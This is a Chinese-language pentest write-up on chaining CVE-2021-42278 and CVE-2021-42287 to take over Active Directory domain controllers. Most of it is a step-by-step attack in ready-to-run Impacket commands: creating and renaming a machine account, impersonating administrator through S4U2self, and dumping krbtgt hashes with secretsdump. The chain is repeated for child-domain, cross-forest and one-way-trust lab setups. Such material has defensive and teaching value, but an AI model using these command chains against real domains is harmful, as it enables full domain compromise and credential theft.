# 漏洞概述

## CVE-2021-42278
在Active Directory (AD) 中，如果所有机器名称都以 `$` 符号结尾，但 AD 不会检查机器账户名末尾是否带有 `$` 符号，这将导致潜在的安全漏洞。

## CVE-2021-42287
当用户申请服务票据（ST）时，首先需要申请票据授予票据（TGT），然后使用 TGT 向票据授予服务（TGS）请求 ST。如果 KDC 未找到 TGT 中指定的服务名称，它会在该服务名称后添加 `$` 符号并重新搜索。
1. 用户 A 申请了 TGT。
2. 申请完 TGT 后，删除用户 A。
3. 使用用户 A 的 TGT 以其他用户的身份为用户 A 请求 ST（S4U2self）。
4. KDC 找不到用户 A，进而查询 A$。

# 影响版本

### CVE-2021-42287
- Windows Server 2012 R2 (Server Core installation)
- Windows Server 2012 R2
- Windows Server 2012 (Server Core installation)
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2012
- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for x64-based Systems Service Pack 2
- Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for 32-bit Systems Service Pack 2
- Windows Server 2016 (Server Core installation)
- Windows Server 2016
- Windows Server, version 20H2 (Server Core Installation)
- Windows Server, version 2004 (Server Core installation)
- Windows Server 2022 (Server Core installation)
- Windows Server 2022
- Windows Server 2019 (Server Core installation)
- Windows Server 2019

### CVE-2021-42278
- Windows Server 2012 R2
- Windows Server 2012 (Server Core installation)
- Windows Server 2012
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for x64-based Systems Service Pack 2
- Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for 32-bit Systems Service Pack 2
- Windows Server 2016 (Server Core installation)
- Windows Server 2016
- Windows Server, version 20H2 (Server Core Installation)
- Windows Server, version 2004 (Server Core installation)
- Windows Server 2022 (Server Core installation)
- Windows Server 2019 (Server Core installation)
- Windows Server 2022
- Windows Server 2019
- Windows Server 2012 R2 (Server Core installation)

# 组合利用 CVE-2021-42278 和 CVE-2021-42287
1. 创建一个与域 DC 机器账户名 `DC1$` 相同的机器账户 `DC1`（不带 `$` 符号）。
2. 申请 TGT。
3. 修改或删除新增的机器账户名称。
4. 使用申请到的 TGT 进行 S4U2self，向 TGS 请求 ST。此时 KDC 找不到机器账户 `DC1`。
5. KDC 转而查找 `DC1$`（即 DC 本身）。发现 `DC1$` 账户后，使用 `DC1$`（DC 本身）的 NTLM 哈希加密 ST。
6. 获得高权限 ST。

# 漏洞利用

## 前提条件
### ms-DS-MachineAccountQuota
- 需要创建一个机器账户，即需要创建机器账户的权限。
- 作为域内用户的属性，`ms-DS-MachineAccountQuota` 代表该域内可以创建的机器账户数量，默认值为 10。在这个场景中，`ms-DS-MachineAccountQuota > 0` 即可。
- 需要增加、修改或删除机器账户名，因此需要对 `sAMAccountName` 属性有写权限。
- 需要使用 S4U 协议，因此账户必须具有 SPN 属性的值，需要对 `servicePrincipalName` 属性有写权限。
- 创建者对 `sAMAccountName` 和 `servicePrincipalName` 属性具有写权限。

查看/编辑 `ms-DS-MachineAccountQuota`:
- 方法 1: ADSI Edit -> 选择对应域名 -> 属性 -> `ms-DS-MachineAccountQuota`
- 方法 2: 使用 PowerView  
  ```powershell
  (Get-DomainObject | select ms-DS-MachineAccountQuota | out-string).trim()
  ```
- 方法 3: 使用 ldapsearch 或 windapsearch  
  ```bash
  ldapsearch -x -H ldap://192.168.1.99 -D 'sub\usera' -w 'admin123..' -b "DC=sub,DC=b,DC=local" | grep "ms-ds-machineaccountquota" -i
  ```
  ```bash
  ./windapsearch --dc 192.168.1.99 -d sub.b.local -u usera -p 'admin123..' -m custom --filter '(&(objectClass=domain)(distinguishedName=DC=sub,DC=b,DC=local))' --attrs ms-ds-machineAccountQuota
  ```

### 已认证用户拥有 SeMachineAccountPrivilege 权限
- 默认情况下，`Authenticated Users` 在 GPO 配置中具有 `Add workstations to domain` 权限 (`SeMachineAccountPrivilege`)。
- 查询谁有 `Add workstations to domain` 权限：
  ```powershell
  powershell -exec bypass -Command "&{import-module .\powerview.ps1;(Get-DomainPolicy -Policy dc).privilegerights | select SeMachineAccountPrivilege | %{ $_ | Add-member -NotePropertyname 'Principalname' -Notepropertyvalue (ConvertFrom-SID $_.SeMachineAccountPrivilege.substring(1,$_.SeMachineAccountPrivilege.Length-1));$_ | Format-List}}"
  ```

### 目标 DC 没有打 KB5008380 和 KB5008602 补丁
- 可通过 Rubeus 检测；打完补丁之后返回的 TGT 包很大。

## 漏洞利用步骤
1. **创建一个机器账户**
   ```bash
   python3 addcomputer.py -computer-name 'fakespn$' -computer-pass 'fakespnpassword' -dc-host sub1.sub.b.local -dc-ip 192.168.1.99 sub.b.local/usera:'admin123..'
   ```
2. **清除该机器账户 SPN**
   ```bash
   python3 addspn.py -u 'sub.b.local\usera' -p 'admin123..' -t 'fakespn$' -c 192.168.1.99
   ```
3. **将该机器账户名称重命名为域控机器名**
   ```bash
   python3 renameMachine.py -current-name 'fakespn$' -new-name sub1 -dc-ip 192.168.1.99 sub.b.local/usera:'admin123..'
   ```
4. **为机器账户申请 TGT 票据**
   ```bash
   python3 getTGT.py -dc-ip 192.168.1.99 sub.b.local/sub1:'fakespnpassword'
   ```
5. **重命名/删掉机器账户（致使域控找不到，在后面添加 $ 并重新查找）**
   ```bash
   python3 renameMachine.py -current-name sub1 -new-name 'fakespn$' sub.b.local/usera:'admin123..' -dc-ip 192.168.1.99
   ```
6. **通过 S4U2self 申请 ST**
   ```bash
   KRB5CCNAME=sub1.ccache python3 getST.py -impersonate administrator -spn cifs/sub1.sub.b.local sub.b.local/sub1 -k -no-pass -dc-ip 192.168.1.99 -self
   ```
7. **DCSync**
   ```bash
   KRB5CCNAME=administrator.ccache python3 secretsdump.py -k -no-pass sub1.sub.b.local -dc-ip 192.168.1.99 -just-dc-user 'sub\krbtgt'
   ```
8. **删除添加的机器账户**
   ```bash
   KRB5CCNAME=administrator.ccache python3 addcomputer.py -k -no-pass sub.b.local/administrator -computer-name 'fakespn$' -dc-host sub1.sub.b.local -dc-ip 192.168.1.99 -delete
   ```

实际名称不是显示的名称，而是属性->常规->计算机名（Windows 2000 以前版本）（w）对应的名称。
```bash
python3 renameMachine.py -current-name 'fakespn$' -new-name fakespn2$ -dc-ip 192.168.1.99 sub.b.local/usera:'admin123..'
python3 addcomputer.py -computer-name 'fakespn$' -dc-host sub1.sub.b.local -dc-ip 192.168.1.99 sub.b.local/usera:'admin123..' -delete
python3 addcomputer.py -computer-name 'fakespn2$' -dc-host sub1.sub.b.local -dc-ip 192.168.1.99 sub.b.local/usera:'admin123..' -delete
KRB5CCNAME=administrator.ccache python3 addcomputer.py -k -no-pass sub.b.local/administrator -computer-name 'fakespn2$' -dc-host sub1.sub.b.local -dc-ip 192.168.1.99 -delete
```

## 跨域可能存在的问题
### 是否能跨域创建机器账户
- `SeMachineAccountPrivilege` 权限默认为 `Authenticated Users` 所拥有，域信任账户满足这个条件。

### S4U2self 是否能跨域
- 可以，这意味着当目标域信任当前域时，默认都是可以直接攻击的。

## 林内环境说明
- 子域：`sub2.b.local` 域控 IP：192.168.1.103
- 父域：`b.local` 域控 IP：192.168.1.88 域控主机：`test-dc.b.local`
- 当前拥有 `sub.b.local/test` 用户凭证

执行以下命令：
```bash
python3 addcomputer.py -computer-name 'fakespn$' -computer-pass 'fakespnpassword' -dc-host test-dc.b.local -dc-ip 192.168.1.88 sub2.b.local/test:'admin111..'
python3 addspn.py -u 'sub2.b.local\test' -p 'admin111..' -t 'fakespn$' -c 192.168.1.88
python3 renameMachine.py -current-name 'fakespn$' -new-name test-dc -dc-ip 192.168.1.88 sub2.b.local/test:'admin111..'
python3 getTGT.py -dc-ip 192.168.1.88 b.local/test-dc:'fakespnpassword'
python3 renameMachine.py -current-name test-dc -new-name 'fakespn$' sub2.b.local/test:'admin111..' -dc-ip 192.168.1.88
KRB5CCNAME=test-dc.ccache python3 getST.py -impersonate administrator -spn cifs/test-dc.b.local b.local/test-dc -k -no-pass -dc-ip 192.168.1.88 -self
KRB5CCNAME=administrator.ccache python3 secretsdump.py -k -no-pass test-dc.b.local -dc-ip 192.168.1.103 -target-ip 192.168.1.88 -just-dc-user 'b\administrator'
```

## 林间环境说明
- B 子域：`sub2.b.local` 域控 IP：192.168.1.103
- B 父域：`b.local` 域控 IP：192.168.1.88 域控主机：`test-dc.b.local` 与域 `a.local` 建立双向林间信任
- A 域：`a.local` 域控 IP：192.168.1.111 域控主机：`a-dc.a.local` 与域 `b.local` 建立双向林间信任

执行以下命令：
```bash
python3 addcomputer.py -computer-name 'fakespn$' -computer-pass 'fakespnpassword' -dc-host a-dc.a.local -dc-ip 192.168.1.111 sub2.b.local/test:'admin111..'
python3 addspn.py -u 'sub2.b.local\test' -p 'admin111..' -t 'fakespn$' -c 192.168.1.111
python3 renameMachine.py -current-name 'fakespn$' -new-name a-dc -dc-ip 192.168.1.111 sub2.b.local/test:'admin111..'
python3 getTGT.py -dc-ip 192.168.1.111 a.local/a-dc:'fakespnpassword'
python3 renameMachine.py -current-name a-dc -new-name 'fakespn$' sub2.b.local/test:'admin111..' -dc-ip 192.168.1.111
KRB5CCNAME=a-dc.ccache python3 getST.py -impersonate administrator -spn cifs/a-dc.a.local a.local/a-dc -k -no-pass -dc-ip 192.168.1.111 -self
KRB5CCNAME=administrator.ccache python3 secretsdump.py -k -no-pass a-dc.a.local -dc-ip 192.168.1.103 -target-ip 192.168.1.111 -just-dc-user 'a\krbtgt'
```

## 单向信任
既然双向信任是可行的，那么单向信任呢？整个攻击认证过程中目标域并没有向当前域做认证，因此单向信任理论上也是可以攻击的。

### 环境说明
- pentest.com: 域控主机：`WIN-I5EEUJ7MD5N.pentest.com` IP: 192.168.1.56
- test.lab: 域控主机：`testlab.test.lab` IP: 192.168.1.33
- pentest.com 单向信任 test.lab
- 已拥有 test.lab 域内普通用户 `test` 凭证

执行以下命令：
```bash
python3 addcomputer.py -computer-name 'fakespn$' -computer-pass 'fakespnpassword' -dc-host WIN-I5EEUJ7MD5N.pentest.com -dc-ip 192.168.1.56 test.lab/test:'admin123..'
python3 addspn.py -u 'test.lab\test' -p 'admin123..' -t 'fakespn$' -c 192.168.1.56
python3 renameMachine.py -current-name 'fakespn$' -new-name WIN-I5EEUJ7MD5N -dc-ip 192.168.1.56 test.lab/test:'admin123..'
python3 getTGT.py -dc-ip 192.168.1.56 pentest.com/WIN-I5EEUJ7MD5N:'fakespnpassword'
python3 renameMachine.py -current-name WIN-I5EEUJ7MD5N -new-name 'fakespn$' test.lab/test:'admin123..' -dc-ip 192.168.1.56
KRB5CCNAME=WIN-I5EEUJ7MD5N.ccache python3 getST.py -impersonate administrator -spn cifs/WIN-I5EEUJ7MD5N.pentest.com pentest.com/WIN-I5EEUJ7MD5N -k -no-pass -dc-ip 192.168.1.56 -self
KRB5CCNAME=administrator.ccache python3 secretsdump.py -k -no-pass WIN-I5EEUJ7MD5N.pentest.com -dc-ip 192.168.1.33 -target-ip 192.168.1.56 -just-dc-user 'pentest\krbtgt'
```

# 总结
感谢同事陈XX关于攻击单向信任方面的理论指导。